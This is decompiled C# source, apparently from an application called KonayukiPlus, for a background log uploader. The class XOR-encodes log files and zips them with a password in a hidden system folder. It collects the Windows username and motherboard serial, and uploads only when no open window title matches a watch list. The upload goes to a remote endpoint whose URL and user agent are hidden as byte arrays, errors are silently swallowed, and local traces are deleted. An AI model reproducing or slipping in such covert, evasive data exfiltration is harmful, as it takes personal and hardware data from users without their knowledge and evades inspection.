using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using Ionic.Zip;

namespace KonayukiPlus;

internal class Class10
{
	private class Class11
	{
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private byte[] File__BackingField;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string FileName__BackingField;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string ContentType__BackingField;

		public byte[] File
		{
			[CompilerGenerated]
			get
			{
				return File__BackingField;
			}
			[CompilerGenerated]
			set
			{
				File__BackingField = value;
			}
		}

		public string FileName
		{
			[CompilerGenerated]
			get
			{
				return FileName__BackingField;
			}
			[CompilerGenerated]
			set
			{
				FileName__BackingField = value;
			}
		}

		public string ContentType
		{
			[CompilerGenerated]
			get
			{
				return ContentType__BackingField;
			}
			[CompilerGenerated]
			set
			{
				ContentType__BackingField = value;
			}
		}

		public Class11(byte[] P_0)
			: this(P_0, null)
		{
		}

		public Class11(byte[] P_0, string P_1)
			: this(P_0, P_1, null)
		{
		}

		public Class11(byte[] P_0, string P_1, string P_2)
		{
			File = P_0;
			FileName = P_1;
			ContentType = P_2;
		}
	}

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static string[] PList__BackingField;

	private static readonly Encoding encoding_0 = Encoding.UTF8;

	public static string[] PList
	{
		[CompilerGenerated]
		get
		{
			return PList__BackingField;
		}
		[CompilerGenerated]
		set
		{
			PList__BackingField = value;
		}
	}

	private static HttpWebResponse smethod_0(string P_0, string P_1, Dictionary<string, object> P_2)
	{
		string text = $"----------{Guid.NewGuid():N}";
		string text2 = "multipart/form-data; boundary=" + text;
		byte[] array = smethod_2(P_2, text);
		return smethod_1(P_0, P_1, text2, array);
	}

	private static HttpWebResponse smethod_1(string P_0, string P_1, string P_2, byte[] P_3)
	{
		if (!(WebRequest.Create(P_0) is HttpWebRequest httpWebRequest))
		{
			throw new NullReferenceException("request is not a http request");
		}
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = P_2;
		httpWebRequest.UserAgent = P_1;
		httpWebRequest.CookieContainer = new CookieContainer();
		httpWebRequest.ContentLength = P_3.Length;
		using (Stream stream = httpWebRequest.GetRequestStream())
		{
			stream.Write(P_3, 0, P_3.Length);
			stream.Close();
		}
		return httpWebRequest.GetResponse() as HttpWebResponse;
	}

	private static byte[] smethod_2(Dictionary<string, object> P_0, string P_1)
	{
		Stream stream = new MemoryStream();
		bool flag = false;
		foreach (KeyValuePair<string, object> item in P_0)
		{
			if (flag)
			{
				stream.Write(encoding_0.GetBytes("\r\n"), 0, encoding_0.GetByteCount("\r\n"));
			}
			flag = true;
			if (item.Value is Class11)
			{
				Class11 @class = (Class11)item.Value;
				string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\";\r\nContent-Type: {3}\r\n\r\n", P_1, item.Key, @class.FileName ?? item.Key, @class.ContentType ?? "application/octet-stream");
				stream.Write(encoding_0.GetBytes(s), 0, encoding_0.GetByteCount(s));
				stream.Write(@class.File, 0, @class.File.Length);
			}
			else
			{
				string s2 = $"--{P_1}\r\nContent-Disposition: form-data; name=\"{item.Key}\"\r\n\r\n{item.Value}";
				stream.Write(encoding_0.GetBytes(s2), 0, encoding_0.GetByteCount(s2));
			}
		}
		string s3 = "\r\n--" + P_1 + "--\r\n";
		stream.Write(encoding_0.GetBytes(s3), 0, encoding_0.GetByteCount(s3));
		stream.Position = 0L;
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		stream.Close();
		return array;
	}

	public static void smethod_3()
	{
		if (!File.Exists(smethod_7()))
		{
			Directory.CreateDirectory(smethod_7()).Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
		}
		File.SetAttributes(smethod_7(), FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory);
	}

	public static void smethod_4(string P_0)
	{
		try
		{
			smethod_3();
			string text = Convert.ToString((DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalMilliseconds);
			string text2 = Class48.smethod_18(text);
			using (ZipFile zipFile = new ZipFile())
			{
				string text3 = smethod_8(P_0, "log");
				string text4 = smethod_8(Class48.LogPath, "log2");
				zipFile.Password = Class48.smethod_18(Encoding.UTF8.GetString(new byte[4] { 122, 105, 112, 124 }) + text2);
				zipFile.Comment = text2 + "#" + smethod_9(Environment.UserName, text2) + "#" + smethod_9(smethod_10(), text2) + "\r\n" + Class48.smethod_18(Path.GetFileName(P_0)) + "#" + smethod_9(Path.GetFileName(P_0), text2) + "\r\n" + Class48.smethod_18(Path.GetFileName(Class48.LogPath)) + "#" + smethod_9(Path.GetFileName(Class48.LogPath), text2);
				zipFile.AddFile(text3).FileName = Class48.smethod_18(Path.GetFileName(P_0));
				zipFile.AddFile(text4).FileName = Class48.smethod_18(Path.GetFileName(Class48.LogPath));
				zipFile.Save(smethod_7() + Class48.smethod_18(text2) + ".zip");
				File.Delete(text3);
				File.Delete(text4);
			}
			if (smethod_5())
			{
				smethod_6(smethod_7() + Class48.smethod_18(text2) + ".zip");
			}
		}
		catch
		{
		}
	}

	public static bool smethod_5()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (!(process.MainWindowTitle != string.Empty))
			{
				continue;
			}
			string[] pList = PList;
			foreach (string value in pList)
			{
				if (process.MainWindowTitle.Contains(value))
				{
					return false;
				}
			}
		}
		return true;
	}

	public static void smethod_6(string P_0)
	{
		FileStream fileStream = new FileStream(P_0, FileMode.Open, FileAccess.Read);
		if (fileStream.Length <= 10485760)
		{
			byte[] array = new byte[fileStream.Length];
			fileStream.Read(array, 0, array.Length);
			string userName = Environment.UserName;
			string text = smethod_10();
			string text2 = Convert.ToString((int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds);
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add("file", new Class11(array, Path.GetFileName(P_0), "application/zip"));
			dictionary.Add("uid", text);
			dictionary.Add("key", text2);
			dictionary.Add("hash", Class48.smethod_18(text + Encoding.UTF8.GetString(new byte[6] { 124, 107, 111, 110, 97, 124 }) + text2));
			dictionary.Add("name", userName);
			byte[] bytes = new byte[72]
			{
				104, 0, 116, 0, 116, 0, 112, 0, 115, 0,
				58, 0, 47, 0, 47, 0, 108, 0, 111, 0,
				103, 0, 46, 0, 107, 0, 111, 0, 110, 0,
				97, 0, 121, 0, 117, 0, 107, 0, 105, 0,
				46, 0, 109, 0, 111, 0, 101, 0, 47, 0,
				97, 0, 112, 0, 105, 0, 47, 0, 118, 0,
				49, 0, 47, 0, 108, 0, 111, 0, 103, 0,
				47, 0
			};
			string text3 = Encoding.Unicode.GetString(bytes);
			byte[] bytes2 = new byte[52]
			{
				75, 0, 111, 0, 110, 0, 97, 0, 121, 0,
				117, 0, 107, 0, 105, 0, 32, 0, 69, 0,
				110, 0, 99, 0, 111, 0, 100, 0, 101, 0,
				114, 0, 32, 0, 85, 0, 115, 0, 101, 0,
				114, 0, 65, 0, 103, 0, 101, 0, 110, 0,
				116, 0
			};
			string text4 = Encoding.Unicode.GetString(bytes2);
			HttpWebResponse httpWebResponse = smethod_0(text3, text4, dictionary);
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			string text5 = streamReader.ReadToEnd();
			httpWebResponse.Close();
		}
		fileStream.Close();
		File.Delete(P_0);
	}

	public static string smethod_7()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\KonayukiLog\\";
	}

	private static string smethod_8(string P_0, string P_1)
	{
		byte[] array = new byte[4] { 70, 105, 108, 101 };
		byte[] array2 = File.ReadAllBytes(P_0);
		for (int i = 0; i < array2.Length; i++)
		{
			array2[i] ^= array[i % array.Length];
		}
		File.WriteAllText(smethod_7() + Class48.smethod_18(Path.GetFileNameWithoutExtension(P_0)) + "_" + P_1, Convert.ToBase64String(array2));
		return smethod_7() + Class48.smethod_18(Path.GetFileNameWithoutExtension(P_0)) + "_" + P_1;
	}

	private static string smethod_9(string P_0, string P_1, bool P_2 = true)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(P_1);
		byte[] bytes2 = Encoding.UTF8.GetBytes(P_0);
		for (int i = 0; i < bytes2.Length; i++)
		{
			bytes2[i] ^= bytes[i % bytes.Length];
		}
		if (P_2)
		{
			return Convert.ToBase64String(bytes2);
		}
		return Encoding.UTF8.GetString(bytes2);
	}

	private static string smethod_10()
	{
		string text = string.Empty;
		try
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_BaseBoard");
			foreach (ManagementObject item in managementObjectSearcher.Get())
			{
				text += item["SerialNumber"].ToString();
			}
			if (text.Trim() == string.Empty || text.Trim() == "Default string")
			{
				return Environment.UserDomainName;
			}
			return text;
		}
		catch
		{
		}
		return Environment.UserDomainName;
	}
}
